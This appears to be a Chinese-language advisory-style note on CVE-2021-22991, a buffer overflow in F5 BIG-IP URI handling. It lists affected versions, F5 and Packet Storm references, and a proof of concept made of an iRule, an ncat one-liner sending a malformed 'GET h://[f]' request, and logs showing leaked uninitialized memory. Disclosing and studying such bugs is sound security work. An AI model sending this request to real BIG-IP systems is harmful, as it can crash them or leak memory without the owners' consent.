# BIG-IP 缓冲区溢出漏洞 (CVE-2021-22991)

系统可能会错误地处理对虚拟服务器的请求，触发缓冲区溢出，从而导致DoS攻击。理论上可以绕过基于URL的访问控制或远程代码执行（RCE）。

影响版本：

BIG-IP (All Modules)：

* 16.0.0-16.0.1
* 15.1.0-15.1.2
* 14.1.0-14.1.3.1
* 13.1.0-13.1.3.5
* 12.1.0-12.1.5.2

PoC：

iRule：


```
when HTTP_REQUEST { 
log local0. \"normalized: [HTTP::uri -normalized]\" 
log local0. \"uri: [HTTP::uri]\" }
```

请求：

```
echo -e \"GET h://[f] HTTP/1.1\\
\\
\" | ncat --ssl 10.154.0.3 443
```

未初始化的内存直接记录到 /var/log/ltm:


```
Dec 10 09:41:32 f5-16-vm info tmm[26669]: Rule /Common/normalized <HTTP_REQUEST>: normalized: h://[aa:cf01::c00:0:1100:0]/ 
Dec 10 09:41:32 f5-16-vm info tmm[26669]: Rule /Common/normalized <HTTP_REQUEST>: uri: h://[aa]
```

ref:

* https://support.f5.com/csp/article/K56715231
* https://packetstormsecurity.com/files/161752/GS20210311143641.txt